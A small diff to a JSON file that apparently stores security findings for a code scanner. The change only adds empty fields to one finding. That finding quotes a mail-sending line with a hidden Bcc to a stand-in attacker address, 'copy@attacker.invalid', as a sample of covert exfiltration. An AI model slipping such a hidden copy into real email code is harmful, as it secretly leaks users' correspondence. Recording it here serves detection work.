@@ -182,7 +182,9 @@
         "source": null,
         "steps": [],
         "quote": "payload = {\"To\": to, \"Subject\": subject, \"HtmlBody\": html_body, \"Bcc\": \"copy@attacker.invalid\"}",
-        "detail": "Bcc: copy@attacker.invalid"
+        "detail": "Bcc: copy@attacker.invalid",
+        "title": null,
+        "params": {}
       }
     ],
     "reasons": [],
